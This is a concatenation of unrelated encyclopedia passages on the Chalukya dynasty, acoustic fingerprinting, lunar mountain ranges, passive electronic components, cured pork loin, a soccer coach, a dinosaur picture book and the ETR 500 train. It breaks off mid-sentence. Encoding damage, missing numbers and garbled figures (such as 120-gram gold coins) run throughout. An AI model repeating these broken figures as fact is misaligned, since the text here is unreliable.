temples, defined the Karnata dravida tradition.Hardy (1995), pp. 6‚Äì7 The most notable of the many buildings dating from this period are the Mahadeva Temple at Itagi in the Koppal district,Cousens (1926), pp. 100‚Äì102Hardy (1995), p. 333 the Kasivisvesvara Temple at Lakkundi in the Gadag district,Cousens (1926), pp. 79‚Äì82Hardy (1995), p. 336 the Mallikarjuna Temple at Kuruvatti, and the Kallesvara Temple at Bagali,Hardy (1995), p. 323 both in the Davangere district.The Mahadeva Temple at Itagi has been called the finest in Kannada country after the Hoysaleswara temple at Halebidu (Cousens in Kamath 2001, p 117) Other notable constructions are the Dodda Basappa Temple at Dambal (Gadag district),Cousens (1926), pp. 114‚Äì115Hardy (1995), p. 326 the Siddhesvara Temple at Haveri (Haveri district),Cousens (1926), pp. 85‚Äì87Hardy (1995), p. 330 and the Amrtesvara Temple at Annigeri (Dharwad district).Foekema (2003), p. 52Hardy (1995), p. 321 The Eastern Chalukyas built some fine temples at Alampur, in modern eastern Andhra Pradesh.Hardy (1995), p. 66The Badami Chalukyas influenced the art of the rulers of Vengi and those of Gujarat (Kamath 2001, pp. 68, 69) File:Badami, H√∂hle 4, Bahubali (1999).jpgBahubali at Jain Cave temple No. 4 at Badami, 6th century File:Vishnu image inside cave number 3 in Badami.jpgVishnu image in Cave temple No. 3 File:Bhutanatha temple complex in Badami.jpgBhutanatha group of temples facing the Badami tank File:Parvati temple at Krauncha Giri near Sandur, Ballary district.jpgThe Parvati Temple, located about 140 km southeast to the Badami File:Durga Temple.jpgAihole ‚Äì Durga Temple Front View File:Jain basadi.JPGAihole ‚Äì Meguti Jain Temple File:Mallikarjuna and Kasivisvanatha temples at Pattadakal.jpgMallikarjuna temple in dravidian style and Kashi Vishwanatha temple in nagara style at Pattadakal, built 740 CE File:Badami- shiva.JPGDancing Shiva in cave no. 1 in Badami File:Papanatha temple at Pattadakal.jpgPapanatha temple at Pattadakal ‚Äì fusion of southern and northern Indian styles, 680 CE  Literature  Poetry on stone at the Meguti temple (Aihole inscription) dated 634 CE, in Sanskrit language and old Kannada script, with a Kannada language endorsement of about the same date at the bottom. The Aihole inscription of Pulakeshin II (634) written by his court poet Ravikirti in Sanskrit language and Kannada script is considered as a classical piece of poetry.Quote:\\"He deemed himself the peer of Bharavi and Kalidasa\\". An earlier inscription in Mahakuta, in prose is comparable to the works of Bana (Sastri, 1955, p. 312) A few verses of a poet named Vijayanaka who describes herself as the \\"dark Sarasvati\\" have been preserved. It is possible that she may have been a queen of prince Chandraditya (a son of Pulakeshin II).Sastri, 1955, p. 312 Famous writers in Sanskrit from the Western Chalukya period are Vijnaneshwara who achieved fame by writing Mitakshara, a book on Hindu law, and King Someshvara III, a noted scholar, who compiled an encyclopedia of all arts and sciences called Manasollasa.The writing is on various topics including traditional medicine, music, precious stones, dance etc. (Kamath 2001, p. 106) From the period of the Badami Chalukyas, references are made to the existence of Kannada literature, though not much has survived.Sen (1999), p. 366 Inscriptions however refer to Kannada as the \\"natural language\\".Thapar (2003), p. 345 The Kappe Arabhatta record of c. 700 in tripadi (three line) metre is the earliest available work in Kannada poetics.Sahitya Akademi (1988), p. 1717 Karnateshwara Katha, which was quoted later by Jayakirti, is believed to be a eulogy of Pulakeshin II and to have belonged to this period.Chidananda Murthy in Kamath (2001), p. 67 Other probable Kannada writers, whose works are not extant now but titles of which are known from independent referencesSuch as Indranandi's Srutavatara, Devachandra's Rajavalikathe (Narasimhacharya, 1934, pp. 4‚Äì5); Bhattakalanka's Sabdanusasana of 1604 (Sastri 1955, p. 355) are Syamakundacharya (650), who is said to have authored the Prabhrita, and Srivaradhadeva (also called Tumubuluracharya, 650 or earlier), the possible author of the Chudamani (\\"Crest Jewel\\"), a lengthy commentary on logic.Sastri (1955), p. 355Mugali (1975), p. 13Narasimhacharya (1988), p. 4 The rule of the Western and Eastern Chalukyas, however, is a major event in the history of Kannada and Telugu literatures respectively. By the 9th‚Äì10th centuries, Kannada language had already seen some of its most notable writers. The \\"three gems\\" of Kannada literature, Adikavi Pampa, Sri Ponna and Ranna belonged to this period.Sastri 1955, p. 356Chopra (2003), p. 196, part 1 In the 11th century, Telugu literature was born under the patronage of the Eastern Chalukyas with Nannaya Bhatta as its first writer.Sastri (1955), p. 367  Badami Chalukya country  = Army = The army was well organised and this was the reason for Pulakeshin II's success beyond the Vindyas.Chopra (2003), p. 77, part1 It consisted of an infantry, a cavalry, an elephant corps and a powerful navy. The Chinese traveller Hiuen-Tsiang wrote that the Chalukyan army had hundreds of elephants which were intoxicated with liquor prior to battle.Kamath (2001), p. 64 It was with their navy that they conquered Revatidvipa (Goa), and Puri on east coast of India. Rashtrakuta inscriptions use the term Karnatabala when referring to the powerful Chalukya armies.Kamath 2001, pp. 57, 65 = Land governance = The government, at higher levels, was closely modelled after the Magadhan and Satavahana administrative machinery. The empire was divided into Maharashtrakas (provinces), then into smaller Rashtrakas (Mandala), Vishaya (district), Bhoga (group of 10 villages) which is similar to the Dasagrama unit used by the Kadambas. At the lower levels of administration, the Kadamba style prevailed fully. The Sanjan plates of Vikramaditya I even mentions a land unit called Dasagrama.The breakup of land into mandalas, vishaya existed in the Kadamba administrative machinery (Kamath 2001, pp. 36, 65, 66) In addition to imperial provinces, there were autonomous regions ruled by feudatories such as the Alupas, the Gangas, the Banas and the Sendrakas.Kamath (2001), p. 65 Local assemblies and guilds looked after local issues. Groups of mahajanas (learned brahmins) looked after agraharas (called ghatika or \\"place of higher learning\\") such as at Badami which was served by 2000 mahajans and Aihole which was served by 500 mahajanas. Taxes were levied and were called the herjunka ‚Äì tax on loads, the kirukula ‚Äì tax on retail goods in transit, the bilkode ‚Äì sales tax, the pannaya ‚Äì betel tax, siddaya ‚Äì land tax and the vaddaravula ‚Äì tax levied to support royalty. = Coinage = The Badami Chalukyas minted coins that were of a different standard compared to the coins of the northern kingdoms.However, they issued gold coins that weighed 120 grams, in imitation of the Gupta dynasty (A.V. Narasimha Murthy in Kamath 2001, p. 65) The coins had Nagari and Kannada legends. The coins of Mangalesha had the symbol of a temple on the obverse and a 'sceptre between lamps' or a temple on the reverse. Pulakeshin II's coins had a caparisoned lion facing right on the obverse and a temple on the reverse. The coins weighed 4 grams and were called, in old-Kannada, hun (or honnu) and had fractions such as fana (or fanam) and the quarter fana (the modern day Kannada equivalent being hana ‚Äì which literally means \\"money\\"). A gold coin called gadyana is mentioned in a record at the Vijayeshwara Temple at Pattadakal, which later came to be known as varaha (their royal emblem). = Religion = Vaishnava Cave temple No. 3 at Badami, 578 CE Both Shaivism and Vaishnavism flourished during the Badami Chalukya period, though it seems the former was more popular.Chopra (2003), p. 191, part 1 Famous temples were built in places such as Pattadakal, Aihole and Mahakuta, and priests (archakas) were invited from northern India. Vedic sacrifices, religious vows (vrata) and the giving of gifts (dana) was important.Sastri (1955), p. 391 The Badami kings were followers of Vedic Hinduism and dedicated temples to popular Hindu deities in Aihole. Sculptures of deities testify to the popularity of Hindu Gods such as Vishnu, Shiva, Kartikeya, Ganapathi, Shakti, Surya and Sapta Matrikas (\\"seven mothers\\"). The Badami kings also performed the Ashwamedha (\\"horse sacrifice\\").Kamath 2001, p. 66 The worship of Lajja Gauri, a fertility goddess is known. Jainism too was a prominent religion during this period. The kings of the dynasty were however secular and actively encouraged Jainism. One of the Badami Cave temples is dedicated to the Jain faith. Jain temples were also erected in the Aihole complex, the temple at Maguti being one such example.Chopra (2003), p. 78, part 1 Ravikirti, the court poet of Pulakeshin II was a Jain. Queen Vinayavati consecrated a temple for the Trimurti (\\"Hindu trinity\\") at Badami. Sculptures of the Trimurti, Harihara (half Vishnu, half Shiva) and Ardhanarishwara (half Shiva, half woman) provide ample evidence of their tolerance. Buddhism was on a decline, having made its ingress into Southeast Asia. This is confirmed by the writings of Hiuen-Tsiang. Badami, Aihole, Kurtukoti and Puligere (modern Lakshmeshwar in the Gadag district) were primary places of learning. = Society = The Hindu caste system was present and devadasis were recognised by the government. Some kings had concubines (ganikas) who were given much respect,Vinopoti, a concubine of King Vijayaditya is mentioned with due respect in an inscription (Kamath 2001, p. 67) and Sati was perhaps absent since widows like Vinayavathi and Vijayanka are mentioned in records. Devadasis were however present in temples. Sage Bharata's Natyashastra, the precursor to Bharatanatyam, the classical dance of South India, was popular and is seen in many sculptures and is mentioned in inscriptions.One record mentions an artist called Achala who was well versed in Natyashastra (Kamath 2001, p. 67) Some women from the royal family enjoyed political power in administration. Queen Vijayanka was a noted Sanskrit poet, Kumkumadevi, the younger sister of Vijayaditya (and queen of Alupa King Chitravahana) made several grants and had a Jain basadi called Anesajjebasadi constructed at Puligere,From the Shiggaon plates of c. 707 and Gudigeri inscription dated 1076 (Ramesh 1984, pp. 142, 144) and the queens of Vikramaditya II, Lokamahadevi and Trailokyamahadevi made grants and possibly consecrated the Lokesvara Temple (now called Virupaksha temple) but also and the Mallikarjuna temple respectively at Pattadakal.Cousens (1926), p. 59  In popular culture  The Chalukya era may be seen as the beginning of the fusion of cultures of northern and southern India, making way for the transmission of ideas between the two regions. This is seen clearly in the field of architecture. The Chalukyas spawned the Vesara style of architecture which includes elements of the northern nagara and southern dravida styles. During this period, the expanding Sanskritic culture mingled with local Dravidian vernaculars which were already popular. Dravidian languages maintain these influences even today. This influence helped to enrich literature in these languages.Sastri (1955), p. 309 The Hindu legal system owes much to the Sanskrit work Mitakshara by Vijnaneshwara in the court of Western Chalukya King Vikramaditya VI. Perhaps the greatest work in legal literature, Mitakshara is a commentary on Yajnavalkya and is a treatise on law based on earlier writings and has found acceptance in most parts of India. Englishman Henry Thomas Colebrooke later translated into English the section on inheritance, giving it currency in the British Indian court system.Sastri (1955), p. 324 It was during the Western Chalukya rule that the Bhakti movement gained momentum in South India, in the form of Ramanujacharya and Basavanna, later spreading into northern India. A celebration called Chalukya utsava, a three-day festival of music and dance, organised by the Government of Karnataka, is held every year at Pattadakal, Badami and Aihole. The event is a celebration of the achievements of the Chalukyas in the realm of art, craft, music and dance. The program, which starts at Pattadakal and ends in Aihole, is inaugurated by the Chief Minister of Karnataka. Singers, dancers, poets and other artists from all over the country take part in this event. In the 2006 celebration, 400 art troupes took part in the festivities. Colorful cutouts of the Varaha the Chalukya emblem, Satyashraya Pulakeshin (Pulakeshin II), famous sculptural masterpieces such as Durga, Mahishasuramardhini (Durga killing demon Mahishasura) were present everywhere. The program at Pattadakal is named Anivaritacharigund vedike after the famous architect of the Virupaksha temple, Gundan Anivaritachari. At Badami it is called Chalukya Vijayambika Vedike and at Aihole, Ravikirti Vedike after the famous poet and minister (Ravikirti) in the court of Pulakeshin II. Immadi Pulikeshi, a Kannada movie of the 1960s starring Dr. Rajkumar celebrates the life and times of the great king.

Media identification using acoustic fingerprints can be used to monitor the use of specific musical works and performances on radio broadcast, records, CDs, streaming media and peer-to-peer networks. This identification has been used in copyright compliance, licensing, and other monetization schemes.  Attributes  A robust acoustic fingerprint algorithm must take into account the perceptual characteristics of the audio. If two files sound alike to the human ear, their acoustic fingerprints should match, even if their binary representations are quite different. Acoustic fingerprints are not hash functions, which must be sensitive to any small changes in the data. Acoustic fingerprints are more analogous to human fingerprints where small variations that are insignificant to the features the fingerprint uses are tolerated. One can imagine the case of a smeared human fingerprint impression which can accurately be matched to another fingerprint sample in a reference database; acoustic fingerprints work in a similar way. Perceptual characteristics often exploited by audio fingerprints include average zero crossing rate, estimated tempo, average spectrum, spectral flatness, prominent tones across a set of frequency bands, and bandwidth. Most audio compression techniques will make radical changes to the binary encoding of an audio file, without radically affecting the way it is perceived by the human ear. A robust acoustic fingerprint will allow a recording to be identified after it has gone through such compression, even if the audio quality has been reduced significantly. For use in radio broadcast monitoring, acoustic fingerprints should also be insensitive to analog transmission artifacts. Spectrogram Generating a signature from the audio is essential for searching by sound. One common technique is creating a time-frequency graph called spectrogram. Any piece of audio can be translated to a spectrogram. Each piece of audio is split into some segments over time. In some cases adjacent segments share a common time boundary, in other cases adjacent segments might overlap. The result is a graph that plots three dimensions of audio: frequency vs amplitude (intensity) vs time. Shazam Shazam's algorithm picks out points where there are peaks in the spectrogram which represent higher energy content. Focusing on peaks in the audio greatly reduces the impact that background noise has on audio identification. Shazam builds their fingerprint catalog out as a hash table, where the key is the frequency. They do not just mark a single point in the spectrogram, rather they mark a pair of points: the peak intensity plus a second anchor point. So their database key is not just a single frequency, it is a hash of the frequencies of both points. This leads to fewer hash collisions improving the performance of the hash table.

Montes Apenninus is marked with a \\"K\\". Montes Apenninus are a rugged mountain range on the northern part of the Moon's near side. They are named after the Apennine Mountains in Italy. With their formation dating back about 3.9 billion years, Montes Apenninus are still relatively young. Description This range forms the southeastern border of the large Mare Imbrium lunar mare and the northwestern border of the Terra Nivium highland region. It begins just to the west of the prominent crater Eratosthenes, which abuts against the southern face of the range. To the west of these mountains is a narrow gap where Mare Imbrium in the north joins Mare Insularum to the south. Further to the west are the Montes Carpatus mountains. From Eratosthenes, the mountains form an arcing chain that gradually bends from east to northeast, ending at Promontorium Fresnel at about latitude 29.5¬∞ N. Here is another gap where the Mare Imbrium to the west joins the Mare Serenitatis to the east. At the north end of this gap lie the Montes Caucasus. This range contains several mountains that have received names, listed below ranging from west to northeast: * Mons Wolff * Mons Serao (unofficial name) * Mons Amp√®re * Mons Huygens, often listed as the highest mountain on the Moon (though not the highest point) * Mons Bradley * Mons Hadley Delta * Mons Hadley The last two peaks are perhaps most famous for forming the valley where the Apollo 15 mission made its landing. This landing was considered one of the most scientifically successful missions of the Apollo program and started the last three J-Series missions that included the lunar rover and 3-day stays. Apollo 15 explored smaller peak Mons Hadley Delta (Œ¥) and Rima Hadley rille. This was perhaps the most geologically diverse landing site of the program. Much of this range forms a sharp, rugged rise at the edge of the Mare Imbrium, with a wide expanse of foothills on the far (southeastern) face. There are, however, some rugged foothills on the northwestern side along the section of the range to the southeast of Archimedes. The total length of the range is about , with some of the peaks rising as high as .

They were named by astronomer Johann Heinrich von M√§dler after the Carpathian Mountains in Central Europe. Description This rugged range generally stretches from west to east. The western end begins in the vicinity of the crater T. Mayer, although a few low ridges curve northwards towards Euler crater. At the eastern extreme is a wide gap where Mare Imbrium in the north joins Mare Insularum to the south. Starting at the east side of this gap are the Montes Apenninus, another mountainous range that curves up towards the northeast. Most of this range consists of a series of peaks and rises, separated by valleys that have been penetrated by lava flows. None of the peaks have received individual names, unless one includes Mons Vinogradov to the west of the crater Euler. The surface to the north of the range is nearly level lunar mare, broken only by the occasional wrinkle ridge or minor impact crater. The region south of the range is somewhat rougher, although still covered by lava flows. About 100 kilometers south of the mountains is the well-known ray crater Copernicus, and the irregular outer ramparts of this crater stretch almost to the foothills of the Carpatus range. Also of note is the smaller crater Gay-Lussac, which is attached to the southern part of the range.  Volcanic history  Montes Carpatus has no shortage of volcanic landforms: lava flows, pyroclatic deposits, rilles, and more! Lavas are formed as the mantle begins to melt, so by sampling volcanic rocks of various ages from regions across the Moon scientists can reconstruct the range of compositions and processes over time. The Montes Carpatus formed as a result of the giant impact that formed the mighty Imbrium basin, the mountains are actually the raised rim of the basin.

A passive component, depending on field, may be either a component that consumes but does not produce energy (thermodynamic passivity) or a component that is incapable of power gain (incremental passivity). A component that is not passive is called an active component. An electronic circuit consisting entirely of passive components is called a passive circuit and has the same properties as a passive component. Used out-of-context and without a qualifier, the term passive is ambiguous. Typically, analog designers use this term to refer to incrementally passive components and systems, while control systems engineers will use this to refer to thermodynamically passive ones. Systems for which the small signal model is not passive are sometimes called locally active (e.g. transistors and tunnel diodes). Systems that can generate power about a time-variant unperturbed state are often called parametrically active (e.g. certain types of nonlinear capacitors).Tellegen's Theorem and Electrical Networks. Penfield, Spence, and Duinker. MIT Press, 1970. pg 24-25. Thermodynamic passivity In control systems and circuit network theory, a passive component or circuit is one that consumes energy, but does not produce energy. Under this methodology, voltage and current sources are considered active, while resistors, capacitors, inductors, transistors, tunnel diodes, metamaterials and other dissipative and energy-neutral components are considered passive. Circuit designers will sometimes refer to this class of components as dissipative, or thermodynamically passive. While many books give definitions for passivity, many of these contain subtle errors in how initial conditions are treated and, occasionally, the definitions do not generalize to all types of nonlinear time-varying systems with memory. Below is a correct, formal definition, taken from Wyatt et al. which also explains the problems with many other definitions. Given an n-port R with a state representation S, and initial state x, define available energy EA as: :E_A(x)=\\\\sup_{x \\\\to T \\\\geq 0} \\\\int_0^T -\\\\langle v(t),i(t)\\\\rangle \\\\, \\\\mathord{\\\\operatorname{d}}t where the notation supx‚ÜíT‚â•0 indicates that the supremum is taken over all T ‚â• 0 and all admissible pairs {v(¬∑), i(¬∑)} with the fixed initial state x (e.g., all voltage‚Äìcurrent trajectories for a given initial condition of the system). A system is considered passive if EA is finite for all initial states x. Otherwise, the system is considered active. Roughly speaking, the inner product \\\\langle v(t),i(t) \\\\rangle is the instantaneous power (e.g., the product of voltage and current), and EA is the upper bound on the integral of the instantaneous power (i.e., energy). This upper bound (taken over all T ‚â• 0) is the available energy in the system for the particular initial condition x. If, for all possible initial states of the system, the energy available is finite, then the system is called passive. Incremental passivity In circuit design, informally, passive components refer to ones that are not capable of power gain; this means they cannot amplify signals. Under this definition, passive components include capacitors, inductors, resistors, diodes, transformers, voltage sources, and current sources. They exclude devices like transistors, vacuum tubes, relays, tunnel diodes, and glow tubes. Formally, for a memoryless two-terminal element, this means that the current‚Äìvoltage characteristic is monotonically increasing. For this reason, control systems and circuit network theorists refer to these devices as locally passive, incrementally passive, increasing, monotone increasing, or monotonic. It is not clear how this definition would be formalized to multiport devices with memory - as a practical matter, circuit designers use this term informally, so it may not be necessary to formalize it.This is probably formalized in one of the extensions to Duffin's Theorem. One of the extensions may state that if the small signal model is thermodynamically passive, under some conditions, the overall system will be incrementally passive, and therefore, stable. This needs to be verified. This term is used colloquially in a number of other contexts: * A passive USB to PS/2 adapter consists of wires, and potentially resistors and similar passive (in both the incremental and thermodynamic sense) components. An active USB to PS/2 adapter consists of logic to translate signals (active in the incremental sense) * A passive mixer consists of just resistors (incrementally passive), whereas an active mixer includes components capable of gain (active). * In audio work one can also find both (incrementally) passive and active converters between balanced and unbalanced lines. A passive bal/unbal converter is generally just a transformer along with, of course, the requisite connectors, while an active one typically consists of a differential drive or an instrumentation amplifier. Other definitions of passivity In electronic engineering, devices that exhibit gain or a rectifying function (such as diodes) are considered active. Only capacitors, inductors, and resistors are considered passive.E C Young, \\"passive\\", The New Penguin Dictionary of Electronics, 2nd ed, p. 400, Penguin Books .Louis E. Frenzel, Crash Course in Electronics Technology, p. 140, Newnes, 1997 . In terms of abstract theory, diodes can be considered non-linear resistors, but non-linearity in a resistor would not normally be directional, which is the property that leads to diodes being classified as active.Ian Hickman, Analog Electronics, p. 46, Elsevier, 1999 . United States Patent and Trademark Office is amongst the organisations classing diodes as active devices.Class 257: Active Solid-state Devices\\", U.S. Patent and Trademark Office: Information Products Division, accessed and archived 19 August 2019. Stability Passivity, in most cases, can be used to demonstrate that passive circuits will be stable under specific criteria. Note that this only works if only one of the above definitions of passivity is used - if components from the two are mixed, the systems may be unstable under any criteria. In addition, passive circuits will not necessarily be stable under all stability criteria. For instance, a resonant series LC circuit will have unbounded voltage output for a bounded voltage input, but will be stable in the sense of Lyapunov, and given bounded energy input will have bounded energy output. Passivity is frequently used in control systems to design stable control systems or to show stability in control systems. This is especially important in the design of large, complex control systems (e.g. stability of airplanes). Passivity is also used in some areas of circuit design, especially filter design. Passive filter A passive filter is a kind of electronic filter that is made only from passive components - in contrast to an active filter, it does not require an external power source (beyond the signal). Since most filters are linear, in most cases, passive filters are composed of just the four basic linear elements - resistors, capacitors, inductors, and transformers. More complex passive filters may involve nonlinear elements, or more complex linear elements, such as transmission lines. Television signal splitter consisting of a passive high- pass filter (left) and a passive low-pass filter (right). The antenna is connected to the screw terminals to the left of center. A passive filter has several advantages over an active filter: * Guaranteed stability * Scale better to large signals (tens of amperes, hundreds of volts), where active devices are often impractical * No power supply needed * Often less expensive in discrete designs (unless large coils are required) * For linear filters, potentially greater linearity depending on components required They are commonly used in speaker crossover design (due to the moderately large voltages and currents, and the lack of easy access to a power supply), filters in power distribution networks (due to the large voltages and currents), power supply bypassing (due to low cost, and in some cases, power requirements), as well as a variety of discrete and home brew circuits (for low-cost and simplicity). Passive filters are uncommon in monolithic integrated circuit design, where active devices are inexpensive compared to resistors and capacitors, and inductors are prohibitively expensive. Passive filters are still found, however, in hybrid integrated circuits. Indeed, it may be the desire to incorporate a passive filter that leads the designer to use the hybrid format.

It is typically salted or brined then dry-cured or smoked. Spain Spanish ca√±a de lomo or lomo embuchado In Spanish cuisine, lomo embuchado is a dry-cured meat made from pork tenderloin, sometimes called ca√±a de lomo or just lomo. It is similar to cecina, but with pork instead of beef. Italy In Italian cuisine, there are many variants of lonza stagionata. Capocolla is very similar, but made from the neck muscle rather than the tenderloin, and often stuffed into a casing. Corsica In Corsican cuisine, lonzu is cured loin. Cyprus Sliced lountza (left) along with chiromer, onions and olives In Cypriot cuisine, lountza () is made of pork tenderloin, which is first brined and marinated in red wine, then dried and smoked. It may be sold immediately after smoking, or aged. As it ages, it becomes harder and more strongly flavored. It may be spiced with coriander. Lountza may be served cooked or uncooked with alcoholic drinks such as zivania or wine. Grilled lountza served with other Cypriot foods such as halloumi and kefalotyri cheese often appears in meze platters. Sandwiches made out of grilled lountza and halloumi are favorite fast food snacks in Cyprus. Greece In the northern Cyclades islands of Greece (Mykonos, Syros, Andros, Tinos), louza is preserved pork loin. Bosnia, Croatia, Serbia and Montenegro In Bosnia, Croatia, Serbia and Montenegro smoked, cured loins, tenderloins and shoulder blade are called \\"peƒçenica\\" (literally \\"that which is baked\\") and/or \\"vje≈°alica\\" (literally \\"that which is hung\\"). They are commonly made of pork but beef varieties are also not uncommon. The terms (respectively) refer to the process of smoking over heat and being hung on hooks above the source of the smoke while they're left to cure. The cuts are universally prepared only during the winter and are considered winter food. The latter of two terms is more commonly used for the shoulder blade cut, whereas the tenderloin cut is sometimes also called \\"slatka (sweet) peƒçenica\\". Unlike Mediterranean-style cured meats like prosciutto, pancetta and buƒëola (capocolla) traditionally made in dryer, littoral and near-littoral southern parts of these countries, smoke-cured loins are traditionally cured meats from the inner continental regions and harsh, freezing continental winters are a big part of curing specifics and flavor. The cuts are first brined in solution of salt and garlic (locally \\"salamura\\"), to enhance flavor and help preservation, commonly together with continental-style bacon (\\"slanina\\" locally), lardon (also called \\"slanina\\", sometimes \\"white bacon\\" or \\"soap bacon\\") and ribs. Then they are cured by hanging them in freezing winter winds, over a smoldering lumber (smoke being essential part of the flavor) for typically up to two months, because the freezing continental temperatures and lack of insects in the winter help curing and preservation. The smolder is occasionally extinguished completely to expose the meat fully to the freezing wind. The flavor is, as a consequence, much more intensely smoked and garlic tinged than is the case with Mediterranean-style cured meat and the cuts are typically dryer and harder. They are typically served as cold cuts, as part of traditional meze, but are also used as flavoring for various cooked dishes. Etymology All of the names above come directly or indirectly from Latin lumbus 'loin', apart from the Slavic terms from Balkans region which are derived from the actual preparation/curing method.

He was a member of the American National Soccer Hall of Fame. Life Born in Fareham, Newman, after non-league football with Woking, played in the Football League with Portsmouth, Leyton Orient, Crystal Palace and Gillingham. In 1967 Newman came to the United States to play for the Atlanta Chiefs in the National Professional Soccer League (where he was team MVP in 1967), before being traded to the Dallas Tornado during the 1968 season. In addition to playing for the Tornado, Newman also served as an assistant coach during the 1968 season. The next year, Newman became both the head coach, as well as a player, for the Tornado until 1974. At the end of that season, he retired from playing and became the team's dedicated head coach for the 1975 season. He took the Tornado to the NASL championship in 1971. In 1976, he coached the Los Angeles Skyhawks of the American Soccer League (ASL), taking them to the ASL championship, making Newman the only coach to win both an NASL and ASL title. He then returned to the NASL in 1977 to coach the Fort Lauderdale Strikers, where he stayed until 1979. That season, he was forced to don a players uniform and play part of one game after a union strike decimated his team. In July 1980 Newman became coach of the San Diego Sockers. While he had the best Win/Loss record as an outdoor soccer coach, and was named NASL coach of the year in 1971, 1977 and 1984, as well as ASL coach of the year in 1976, he also made his mark in indoor soccer with San Diego with whom he won 10 championships in 11 seasons in two different leagues (NASL and MISL), only losing a semi-final in 1986‚Äì1987 to the Tacoma Stars, bringing his career total to 13. Newman's innovations added new positions and tactics to the indoor game including the sixth attacker and super power play. He along with Eddie Firmani and Al Miller are the only coaches to win both outdoor and indoor NASL titles. Newman became the first coach hired by the MLS when he joined the Kansas City Wizards of Major League Soccer in 1995. The Wizards won the Western Division title in 1997. Newman retired 1999 with an all-time coaching record of 753‚Äì296‚Äì27. He was inducted into the National Soccer Hall of Fame in 1992. He was inducted into the Dallas Walk of Fame 2006. He was also inducted into the San Diego Hall of Champions, as well as the Atlanta Soccer Hall of Fame. Newman received the 'Key of the City' in Fort Lauderdale and twice in San Diego.

Other dinosaurs included in the book are a Stegosaurus, a Triceratops, a Saurolophus, a Pteranodon, an Apatosaurus, and a Deinonychus. A sequel book was later published, Going Hollywood! A Dinosaur's DreamGoing Hollywood: A Dinosaur's Dream-Amazon.com and Your Pet Dinosaur: An Owner's Manual.Amazon.com: Your Pet Dinosaur: An Owner's Manual Plot One day, in the Cretaceous Period, as a Tyrannosaurus named Rex is about to devour a smaller dinosaur, he has captured by a flying saucer piloted by a small, reptilian alien named Vorb. He recruits him and several other dinosaurs (including Bgon the Apatosaurus, Woog the Triceratops, Jorbl the Saurolophus, Spike the Stegosaurus, Dwig the Deinonychus, and Pteri the Pteranodon) he has found for a trial of a special \\"vitamin\\" he has developed which, upon feeding it to the dinosaurs, causes them to become sentient. Vorb takes them aboard his saucer and they travel to the present, dropping them off in New York City, which at that moment is celebrating the Macy's Thanksgiving Day Parade. The dinosaurs pretend to be inflatable balloons to sneak along with the parade, but Rex mistakes one of the real dinosaur balloons to be his Allosaurus friend Worgul. The ruse is broken as a result of him accidentally popping \\"Worgul\\" and the dinosaurs flee as the crowd panics in sight of them. The police come to capture the dinosaurs soon after, but the helpful curator of the American Museum of Natural History, Dr. Miriam Bleeb, takes the dinosaurs in, and hides them from the cops by having them pretend to be life-size model dinosaurs. This satisfies the police, who leave to search for the dinosaurs elsewhere, and the curator lets them stay for the night. She reads them a bedtime story about a trilobite who wanted to walk on land, while the dinosaurs watch out the window, unsure about their future.

Designed under the aegis of the Ferrovie dello Stato (FS), it is now operated by Trenitalia on RFI tracks. History Prototype set ETR.500-X at an exposition in Bologna in 1994. The opening of the Direttissima line, connecting Florence with Rome, in stages between 1978 and 1991 was the first high speed line in Europe. Then, in the 1990s, FS unveiled plans to build a whole new high speed network. As the larger part of the network would be suited for speeds of , new, non-tilting trains had to be designed as the tilting equipment used in the ETR 450, 460 and 480 Pendolino series was not suited for speeds of over . The new train was to be built by the TREVI (TREno Veloce Italiano, \\"Italian Fast Train\\") formed by Breda Costuzioni Ferroviarie, FIAT Ferroviaria, Tecnomasio and Firema Trasporti. Prototypes In 1988 the first prototype motorcar, called ETR 500-X and nicknamed \\"Remo,\\" as the brother of the first Roman king, rolled out of the factory in Vado Ligure. It was tested on the Direttissima line in the combination of a measuring car and an E 444 locomotive, reaching a record speed of . In 1990 the 2 first complete trainsets, called ETR 500-Y and nicknamed \\"Romolo,\\" as the first Roman king, were delivered. They were used as test units between their delivery and 1995, when the first production sets entered into service. Between 1995 and 1997 they were also used in normal commercial service when there was a shortage of normal ETR.500 trainsets. The 3 motorcars of the prototype sets are now based at different locations in Italy and unfortunately have been vandalised and graffitized. The middle cars of the 2 ETR 500-Y sets are now part of the two RFI ETR.500 test trains Y1 and Y2. First generation After the success of the 2 prototypes, FS decided to order 30 mono-current trainsets supporting the 3 kV DC supply of existing lines. Delivered between 1992 and 1996, with interiors styled by design company Pininfarina, they consist of 2 motorcars (numbered E 404 100 to 159), four first class cars, a restaurant car, and six second class cars. Although suited for driving , they were limited to on the Direttissima as the current drawn from the catenary at would be too high. This was also the reason why a second generation, dual-voltage trains was ordered. Major routes of this train were Chiusi-Milan, Florence-Naples, Milan-Rome Termini, Milan-Naples, Bologna-Rome Termini, Milan-Salerno, Milan-Venice, Venice-Rome Termini. Between 2006 and 2008, the first generation trains have been upgraded with newly built E.404 6xx dual-voltage motorcars, coupled to the existing middle cars. All E.404 0xx motorcars of the older trainsets have been refurbished and transformed into locomotives of the type E.414, to haul EuroStarCity trains on selected routes. These trains consist of two E.414 locomotives and 10 former Intercity UIC-Z coaches. Although the coaches are \\"normal\\" Intercity coaches, they will mostly remain in semi-permanent coupled formation with the two E.414 locomotives. Second generation With the new high-speed lines finally in construction, FS chose to electrify the lines at instead of 3 kV DC as used on the classic network. This allows the trains to drive at their top speed of , as 3 kV is technically limited to operation. As the first generation trains can not operate off 25 kV AC, new trains had to be ordered. As the new trains can run both off 25 kV AC and 3 kV DC, they were designated P for politensione (multi-voltage). The new power cars of the trains feature a totally different design than the first generation trainsets, although also designed by design company Pininfarina. These new trains, delivered between 2000 and 2005, consist in original formation of 2 motorcars, four 1st class cars, a restaurant car, and six 2nd class cars. However, with the addition of a Business class car after the four 1st class cars to all trainsets, expansion to 12 middle cars was finished in 2004. The ETR 500 P started regular service with their commercial top speed of on the Rome-Naples and Torino-Novara high-speed lines, when those lines were opened for revenue service on 22 December 2005 resp. 1 February 2006. The second generation trains can be divided in multiple sub-series. They were delivered in three batches: * ETR 500 P ord. '96 (sets 31-60 with power cars numbered E.404 500-559): trainset built as new. * ETR 500 P ord. '02 (sets 1-30 with power cars numbered E.404 600-659): power cars built as new for use with cars from the 1st generation (mono-current) trainsets. * power cars E.404 660-663: an extension of the second batch, to replace four power cars sold to infrastructure authority RFI (see below), delivered in 2007-8. In addition, there are rebuilt and refurbished versions: * ETR 500 F: trainsets modified for operation in France (F for Francia = France). This version was tri- current, as it was also enabled for the 1.5 kV DC system used on conventional lines in Southern France. These sets had only 8 middle cars: three 1st class cars, a restaurant car, and four 2nd class cars. Multiple trains, including sets 39, 54, 58 and 